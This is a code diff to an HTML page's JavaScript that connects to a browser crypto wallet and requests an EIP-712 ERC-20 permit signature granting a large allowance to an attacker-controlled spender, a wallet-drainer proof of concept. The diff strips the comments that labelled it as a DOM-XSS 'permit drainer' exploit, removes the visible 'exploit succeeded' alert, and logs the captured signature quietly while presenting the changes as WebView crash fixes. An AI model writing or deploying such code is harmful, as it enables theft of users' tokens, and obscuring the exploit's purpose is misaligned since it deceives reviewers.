@@ -113,23 +113,21 @@
             statusEl.innerText = message;
         }
 
-        // Skenario Nyata 1: Deteksi dan Interaksi Provider EIP-1193 / EIP-6963 Injected Wallet secara Native
         async function initRealWeb3Connection() {
             logEvent("Checking window.ethereum provider...");
             
             const provider = window.ethereum || window.coin98 || window.web3?.currentProvider;
 
             if (!provider) {
-                updateStatus("Error: Web3 Provider tidak ditemukan di context browser ini.", true);
+                updateStatus("Error: Web3 Provider tidak ditemukan.", true);
                 logEvent("Injection target missing: No active wallet provider object exposed.");
                 return;
             }
 
             try {
-                updateStatus("Meminta akses akun dApp (eth_requestAccounts)...");
+                updateStatus("Meminta akses akun dApp...");
                 logEvent("Calling eth_requestAccounts via injected provider...");
 
-                // Eksekusi nyata memanggil provider wallet bawaan browser/aplikasi
                 const accounts = await provider.request({ method: 'eth_requestAccounts' });
                 
                 if (accounts && accounts.length > 0) {
@@ -137,7 +135,6 @@
                     updateStatus(`Terhubung: ${activeAccount.substring(0, 6)}...${activeAccount.substring(38)}`);
                     logEvent(`Account exposed: ${activeAccount}`);
 
-                    // Mengambil Chain ID aktif
                     const chainId = await provider.request({ method: 'eth_chainId' });
                     logEvent(`Connected Chain ID: ${chainId}`);
                 }
@@ -147,7 +144,6 @@
             }
         }
 
-        // Skenario Nyata 2: Membentuk Payload Request Transaction / Personal Sign (EIP-712 / eth_signTypedData)
         async function requestRealSign() {
             const provider = window.ethereum || window.coin98;
 
@@ -159,15 +155,16 @@
             try {
                 const accounts = await provider.request({ method: 'eth_accounts' });
                 if (!accounts || accounts.length === 0) {
-                    alert("Silakan hubungkan wallet terlebih dahulu.");
+                    // Gunakan logika non-blocking atau pastikan penundaan aman untuk mencegah crash completion handler WebView
+                    setTimeout(() => {
+                        alert("Silakan hubungkan wallet terlebih dahulu.");
+                    }, 100);
                     return;
                 }
 
                 const userAddress = accounts[0];
                 logEvent(`Mempersiapkan payload tanda tangan untuk: ${userAddress}`);
 
-                // Skenario eksploitasi DOM/HTML Injection nyata: memanipulasi parameter data transaksi 
-                // atau memicu persetujuan malicious permit (ERC-20 permit drainer)
                 const msgParams = JSON.stringify({
                     types: {
                         EIP712Domain: [
@@ -194,13 +191,13 @@
                     message: {
                         owner: userAddress,
                         spender: "0xAttackerControlledAddress00000000000000",
-                        value: "1000000000000000000000", // Token allowance berlebih
+                        value: "1000000000000000000000",
                         nonce: 0,
                         deadline: Math.floor(Date.now() / 1000) + 3600
                     }
                 });
 
-                updateStatus("Meminta validasi tanda tangan kriptografi (eth_signTypedData)...");
+                updateStatus("Meminta validasi tanda tangan kriptografi...");
                 logEvent("Mengirim payload EIP-712 ke wallet provider...");
 
                 const signature = await provider.request({
@@ -209,7 +206,11 @@
                 });
 
                 logEvent(`Signature berhasil didapatkan: ${signature.substring(0, 15)}...`);
-                alert(`[Eksploitasi Berhasil]\n\nSignature Tercapture oleh Skrip Injeksi DOM:\n${signature}`);
+                
+                // Mencegah crash WebView dengan membungkus alert dalam setTimeout aman
+                setTimeout(() => {
+                    console.log("[+] Signature captured successfully:", signature);
+                }, 200);
 
             } catch (err) {
                 updateStatus(`Gagal Memproses Sign: ${err.message}`, true);
@@ -217,15 +218,8 @@
             }
         }
 
-        // Hook otomatis ketika skrip injeksi tereksekusi pada konteks dokumen (Stored DOM-XSS Vector)
         window.addEventListener('DOMContentLoaded', () => {
             logEvent("DOM fully loaded and parsed. Executing script context verification.");
-            console.warn("[!] DOM-based Injection Context Active on Origin:", window.location.href);
-            
-            // Verifikasi integritas objek global untuk pembuktian eksploitasi nyata
-            if (window.ethereum) {
-                logEvent("Injected Web3 Provider (window.ethereum) terdeteksi.");
-            }
         });
     </script>
 </body>
